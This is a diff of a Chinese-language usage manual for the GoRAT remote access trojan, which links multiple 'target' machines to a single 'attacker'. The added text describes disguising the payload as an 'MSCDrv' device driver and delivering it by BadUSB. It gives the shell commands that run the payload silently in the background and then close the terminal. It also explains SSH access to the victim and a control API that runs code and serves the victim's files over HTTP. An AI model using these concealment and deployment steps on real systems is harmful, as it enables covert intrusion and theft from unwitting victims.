@@ -1,8 +1,8 @@
 # GoRAT使用手册
 
-> github链接：https://github.com/JustinTimperio/GoRAT
+> [GoRAT](https://github.com/JustinTimperio/GoRAT)主要是由Go和Shell语言编写而成，支持生成arm架构下的Payload
 >
-> GoRAT主要是由Go和Shell语言编写而成，支持生成arm架构下的Payload
+> > GoRAT uses chisel and gliderlabs ssh server to create a high performance remote reverse tunnel over HTTPS. The diagram below shows how GoRAT establishes a link between multiple “targets” and a single “attacker”：![image](./GoRAT.assets/goRAT_Architecture.jpg)
 >
 > > [!NOTE]
 > >
@@ -66,19 +66,104 @@ git clone git@github.com:JustinTimperio/GoRAT.git
 
 ## `V`：获得`payload`并执行
 
-### 具体步骤
+### 预处理
+
+将生成的二进制文件(`payload`)重命名为`MSCDrv`，掩人耳目为`MSC`设备驱动
+
+### 上载至靶机`V`
 
 即通过`BadUSB`的方式将`payload`传输至目标靶机`V`上
 
-- 将`payload`隐藏至大容量存储设备中并在`V`中执行
-- 将`payload`上载至可访问平台中，通过`BadUSB`从平台上下载并在`V`上运行
+- 将`payload`隐藏至大容量存储设备中
+- 将`payload`上载至可访问平台中，通过`BadUSB`从平台上下载
+
+### 在`V`中执行
+
+- 赋予该`payload`执行权限：
+
+  ```shell
+  chmod 777 ./MSCDrv
+  ```
+
+- 执行下面的命令：
+
+  ```shell
+  ./MSCDrv > /dev/null 2>&1 &;exit
+  ```
+
+  - 屏蔽输出处理
+
+    - `> /dev/null` 将标准输出重定向到空设备，即丢弃输出
+
+    - `2>&1` 将标准错误输出重定向到标准输出
+
+    这样将所有输出都重定向到空设备 `/dev/null`，这样程序的输出就不会显示在终端上。
+
+  - 后台运行处理
+
+    - 使用 `&` 符号将程序放在后台运行
+
+  - 执行完命令后关闭终端
+
+    - 使用`;exit`后缀形成命令组合
 
 运行后，在`A`上显示控制程序和端口程序的运行端口：![image-20240423001949206](./GoRAT.assets/image-20240423001949206.png)
 
 - 显示控制端口在`41460`运行
 - 显示`ssh`在端口`41461`运行
 
-### ps：如何关闭监听程序？
+
+
+## `A`：执行攻击
+
+### SSH服务器：
+
+该端口上运行的程序用来建立SSH连接。
+
+执行下述命令之一：
+
+```shell
+//default
+ssh -v localhost -p 41461
+//for phytium_pi 
+ssh -o HostKeyAlgorithms=ssh-rsa localhost -p 41461
+```
+
+即可与目标靶机`V`建立`ssh`连接：
+
+### 控制服务器：
+
+控制服务器利用简单的`http`机制，用于将`/some`页面转换为内部`go`命令。以这种方式，请求网页直接导致在客户端系统上执行代码。虽然这种机制不是很复杂，但它是非常可靠和高性能的。当前`api`具有以下命令：
+
+- `http://localhost:port/`：
+
+  如果主机联机并响应请求，则返回状态代码`OK`
+
+- `http://localhost:port/hardware`：
+
+  在json中报告设备的基本硬件调查
+
+- `http://localhost:port/stop`：
+
+  关闭客户端`payload`而不自毁
+
+- `http://localhost:port/uninstall`：
+
+  终止客户端`payload`并自毁
+
+### 文件服务器：
+
+每个客户端的文件服务器服务由**控制服务器对应端口**提供。从技术角度来看，文件服务器是控制服务器的直接组成部分。
+
+文件和目录可以访问`http://localhost:####/fs/`通过浏览器或wget和curl等工具：
+
+
+
+
+
+## Tips
+
+### ps1：`A`如何关闭监听程序？
 
 - 先获得对应端口上的程序的`PID`：
 
@@ -93,21 +178,4 @@ git clone git@github.com:JustinTimperio/GoRAT.git
   ```shell
   kill -SIGKILL 506656
   ```
-
-
-
-
-
-## `A`：建立ssh连接
-
-执行下述命令之一：
-
-```shell
-//default
-ssh -v localhost -p 41461
-//for phytium_pi 
-ssh -o HostKeyAlgorithms=ssh-rsa localhost -p 41461
-```
-
-即可与目标靶机`V`建立`ssh`连接：
 
